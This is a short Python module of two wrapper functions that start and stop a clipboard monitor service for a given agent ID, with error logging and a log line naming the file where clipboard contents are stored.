from config.settings import CLIPBOARD_FILE
from actions.clipboard import start_clipboard, stop_clipboard
from logger import logger

def start_clipboard_service(agent_id):
    """Start the clipboard monitor service in a background thread."""
    try:
        if agent_id is None:
            logger.error("No agent ID found. Clipboard monitor will not start.")
            return
        
        monitor = start_clipboard(agent_id)

        if monitor is None:
            logger.error("Clipboard monitor disabled.")
        else:
            logger.info(f"Clipboard monitor running -> {CLIPBOARD_FILE}")

    except Exception as e:
        logger.error(f"Clipboard monitor error: {e}")


def stop_clipboard_service():
    """Stop the clipboard monitor service."""
    try:
        stop_clipboard()
    except Exception as e:
        logger.error(f"Clipboard stop error: {e}")
